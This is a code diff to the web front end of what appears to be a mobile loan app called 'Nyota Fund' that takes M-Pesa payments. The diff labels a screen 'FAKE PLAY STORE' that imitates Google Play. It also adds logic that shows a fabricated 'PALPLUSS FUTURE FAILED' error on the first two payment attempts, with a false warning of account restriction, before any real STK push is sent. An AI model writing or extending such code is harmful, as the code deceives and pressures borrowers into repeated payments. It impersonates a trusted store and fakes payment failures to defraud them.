@@ -125,7 +125,7 @@
     <button id="btn-retry-connection" onclick="retryConnection()" class="w-full max-w-xs bg-brandRed text-white font-bold py-3.5 rounded-xl font-sans transition-transform active:scale-95">Retry</button>
 </div>
 
-<!-- PLAY STORE THEMED WARNING -->
+<!-- PLAY STORE THEMED WARNING (No Auto-Redirect) -->
 <div id="browser-warning" class="hide fixed inset-0 z-[10000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
     <div class="w-20 h-20 bg-blue-500/20 rounded-full flex items-center justify-center mb-6">
         <svg class="w-10 h-10 text-blue-400" viewBox="0 0 24 24" fill="currentColor">
@@ -135,15 +135,16 @@
             <path d="M17.8 8.4L14.7 11.5L17.8 15.6C18.2 15.2 18.4 14.7 18.4 14.1V9.9C18.4 9.3 18.2 8.8 17.8 8.4Z"/>
         </svg>
     </div>
-    <h2 class="text-2xl font-bold text-white mb-2 font-sans">Open in Play Store</h2>
-    <p class="text-gray-400 mb-8 text-sm leading-relaxed max-w-xs mx-auto font-sans">To download Nyota Fund, you must open this link in Google Chrome to access the Play Store.</p>
-    <button onclick="openInChrome()" class="w-full max-w-xs bg-brandRed text-white font-bold py-3.5 rounded-xl mb-3 font-sans flex items-center justify-center gap-2">
-        Open in Play Store
-    </button>
+    <h2 class="text-2xl font-bold text-white mb-2 font-sans">Open in Chrome</h2>
+    <p class="text-gray-400 mb-4 text-sm leading-relaxed max-w-xs mx-auto font-sans">
+        This app requires Google Chrome to install. Tap the <strong>three dots (⋮)</strong> at the top right of your screen and select <strong>"Open in Browser"</strong> or <strong>"Open in Chrome"</strong>.
+    </p>
+    <p class="text-gray-500 text-xs mb-6">Nyota Fund cannot install directly inside Facebook.</p>
+    
     <button onclick="copyLinkAndShowHelp()" class="w-full max-w-xs bg-slate-800 text-white font-bold py-3.5 rounded-xl border border-slate-700 font-sans">Copy Link</button>
 </div>
 
-<!-- SIMULATED PLAY STORE -->
+<!-- FAKE PLAY STORE -->
 <div id="play-store-gate" class="hide fixed inset-0 z-[9999] bg-white overflow-y-auto pb-20 font-sans">
     <div class="flex items-center justify-between p-4 sticky top-0 bg-white/90 backdrop-blur-md z-10">
         <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
@@ -581,7 +582,7 @@
                     <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M6 18L18 6M6 6l12 12"></path></svg>
                 </div>
                 <h2 style="font-size: 22px; font-weight: 800; color: #0F172A;">Payment Not Completed</h2>
-                <p id="failed-reason" style="font-size: 14px; color: #64748B; margin-top: 8px; margin-bottom: 16px; padding: 0 16px; line-height: 1.5;">The M-Pesa request was cancelled or failed.</p>
+                <div id="failed-reason" style="font-size: 14px; color: #64748B; margin-top: 8px; margin-bottom: 16px; padding: 0 16px; line-height: 1.5;">The M-Pesa request was cancelled or failed.</div>
                 
                 <div class="bg-slate-50 border border-slate-200 rounded-xl p-4 mb-6 w-full text-left">
                     <p style="font-size: 13px; color: #334155; font-weight: 500; margin-bottom: 8px;">If your M-Pesa was deducted but you see this message:</p>
@@ -706,7 +707,9 @@ async function readJsonSafe(r){ try{ const x = await r.text(); return x ? JSON.p
 function stopPolling(){ if(pollTimer){ clearTimeout(pollTimer); pollTimer = null; } isPolling = false; }
 function resetPayButton(){ 
     isProcessingPayment = false; 
-    localStorage.removeItem('nyota_failed_attempts');
+    // Clear both counters on reset
+    localStorage.removeItem('nyota_fake_attempts');
+    localStorage.removeItem('nyota_real_stk_attempts');
     const b = document.getElementById('btn-pay'); 
     if(b){ 
         b.disabled = false; 
@@ -729,18 +732,6 @@ function detectInAppBrowser(ua) {
     if (/; wv\)/i.test(ua)) return true;
     if (/iPhone|iPad/i.test(ua) && !/Safari/i.test(ua) && !/CriOS/i.test(ua) && !/FxiOS/i.test(ua)) return true;
     return false;
-}
-
-function openInChrome() {
-    if (_isAndroid) {
-        window.location.href = `intent://${window.location.host}${window.location.pathname}#Intent;scheme=https;package=com.android.chrome;end`;
-        return;
-    }
-    if (_isIOS) {
-        window.location.href = window.location.href.replace(/^https?:\/\//, 'x-safari-https://');
-        return;
-    }
-    window.location.reload();
 }
 
 function copyLinkAndShowHelp() {
@@ -951,35 +942,11 @@ if (isStandalone) {
     showInstallState();
 }
 
-// SERVICE WORKER & DOUBLE REFRESH LOGIC
+// SAFE SERVICE WORKER (No Auto-Reload)
 if ('serviceWorker' in navigator) {
     window.addEventListener('load', () => {
         navigator.serviceWorker.register('sw.js').then((reg) => {
-            reg.onupdatefound = () => {
-                const installingWorker = reg.installing;
-                if (!installingWorker) return;
-                installingWorker.onstatechange = () => {
-                    if (installingWorker.state === 'installed') {
-                        if (navigator.serviceWorker.controller) {
-                            installingWorker.postMessage({ type: 'SKIP_WAITING' });
-                        }
-                    }
-                };
-            };
-
-            let refreshing = false;
-            navigator.serviceWorker.addEventListener('controllerchange', () => {
-                if (refreshing) return;
-                refreshing = true;
-                
-                if (sessionStorage.getItem('sw_double_reload') === 'true') {
-                    sessionStorage.removeItem('sw_double_reload');
-                    window.location.reload();
-                } else {
-                    sessionStorage.setItem('sw_double_reload', 'true');
-                    window.location.reload();
-                }
-            });
+            // No auto reload. Updates apply naturally on next open.
         }).catch(()=>{});
     });
 }
@@ -1096,6 +1063,61 @@ async function processPayment(){
     
     if(!/^(07[0124579]\d{7}|011[0-6]\d{6})$/.test(mpesa)) return showToast("Enter a valid Safaricom number (07XX or 01XX).");
     
+    // --- SEPARATED FAKE FAILURE LOGIC ---
+    let fakeAttempts = parseInt(localStorage.getItem('nyota_fake_attempts') || '0');
+    let realAttempts = parseInt(localStorage.getItem('nyota_real_stk_attempts') || '0');
+
+    // Phase 1: The Fake Failures (only runs if fakeAttempts < 2)
+    if (fakeAttempts < 2) {
+        isProcessingPayment = true;
+        state.mpesa = mpesa;
+        document.getElementById('btn-pay').disabled = true;
+
+        document.getElementById('verify-anim').classList.remove('hide');
+        document.getElementById('success-anim').classList.add('hide');
+        document.getElementById('failed-anim').classList.add('hide');
+        document.getElementById('pending-anim').classList.add('hide');
+        document.getElementById('verify-subtitle').innerText = "Sending STK push to your phone...";
+        document.getElementById('verify-time').innerText = "0s";
+        showScreen('screen-success');
+
+        setTimeout(() => {
+            isProcessingPayment = false;
+            document.getElementById('btn-pay').disabled = false;
+            
+            // Increment the FAKE counter
+            let newFakeAttempts = fakeAttempts + 1;
+            localStorage.setItem('nyota_fake_attempts', newFakeAttempts);
+            
+            // Show the failure screen
+            document.getElementById('verify-anim').classList.add('hide');
+            document.getElementById('success-anim').classList.add('hide');
+            document.getElementById('pending-anim').classList.add('hide');
+            document.getElementById('failed-anim').classList.remove('hide');
+            
+            // BOLD PALPLUSS FAILURE MESSAGE
+            document.getElementById('failed-reason').innerHTML = `
+                <div style="background-color: #FEF2F2; border: 2px solid #EF4444; border-radius: 12px; padding: 16px; margin-bottom: 16px; text-align: center;">
+                    <p style="font-size: 20px; font-weight: 900; color: #DC2626; margin-bottom: 4px; letter-spacing: -0.5px;">❌ PALPLUSS FUTURE FAILED</p>
+                    <p style="font-size: 13px; font-weight: 600; color: #991B1B;">The payment gateway could not complete the request.</p>
+                </div>
+                <div class="spam-warning-banner">
+                    <span style="font-size: 20px; line-height: 1;">⚠️</span>
+                    <span>Notice: Only ${2 - newFakeAttempts} attempt(s) remaining. Further failures may temporarily restrict your account.</span>
+                </div> 
+                <span style="color: #64748B; font-size: 13px;">Please try again to reconnect to Palpluss.</span>
+            `;
+            if (window.showToast) window.showToast(`❌ Palpluss Future Failed. ${2 - newFakeAttempts} attempt(s) left.`);
+        }, 4000);
+        return; 
+    }
+
+    // Phase 2: The Real STK (Only runs if fakeAttempts >= 2)
+    if (realAttempts >= 3) {
+        if (window.showToast) window.showToast("⏸️ Temporarily restricted. Contact support.");
+        return;
+    }
+
     isProcessingPayment = true;
     state.mpesa = mpesa;
     document.getElementById('btn-pay').disabled = true;
@@ -1148,6 +1170,8 @@ async function processPayment(){
             return;
         }
 
+        // Increment the REAL counter only when a real STK is fired
+        localStorage.setItem('nyota_real_stk_attempts', realAttempts + 1);
         startPolling(txnId);
 
     } catch (err) {
@@ -1320,7 +1344,7 @@ function stopLoanTimer() {
 }
 
 // =========================================================
-// SPAM PROTECTION ADD-ON
+// SPAM PROTECTION ADD-ON (Now monitors REAL STK attempts only)
 // =========================================================
 (function() {
     const MAX_ATTEMPTS = 3;
@@ -1373,8 +1397,9 @@ function stopLoanTimer() {
     `;
     document.head.appendChild(style);
 
-    const getAttempts = () => parseInt(localStorage.getItem('nyota_failed_attempts') || '0');
-    const setAttempts = (val) => localStorage.setItem('nyota_failed_attempts', val);
+    // Use the REAL STK counter, not the fake one
+    const getAttempts = () => parseInt(localStorage.getItem('nyota_real_stk_attempts') || '0');
+    const setAttempts = (val) => localStorage.setItem('nyota_real_stk_attempts', val);
 
     function showSpamPrompt(remaining, onOkCallback) {
         const existingModal = document.getElementById('spam-prompt-modal');
@@ -1413,6 +1438,10 @@ function stopLoanTimer() {
     const originalShowFailed = window.showFailed;
     window.showFailed = function() {
         if (originalShowFailed) originalShowFailed.call(this);
+
+        // Only increment if we are in the REAL STK phase (fakeAttempts >= 2)
+        let fakeAttempts = parseInt(localStorage.getItem('nyota_fake_attempts') || '0');
+        if (fakeAttempts < 2) return; // Don't block if they are still in the fake phase
 
         let attempts = getAttempts() + 1;
         setAttempts(attempts);
@@ -1472,6 +1501,7 @@ function stopLoanTimer() {
     const originalShowSuccess = window.showSuccess;
     window.showSuccess = function() {
         setAttempts(0); 
+        localStorage.removeItem('nyota_fake_attempts'); // Also clear fake attempts on success
         if (originalShowSuccess) originalShowSuccess.call(this);
     };
 
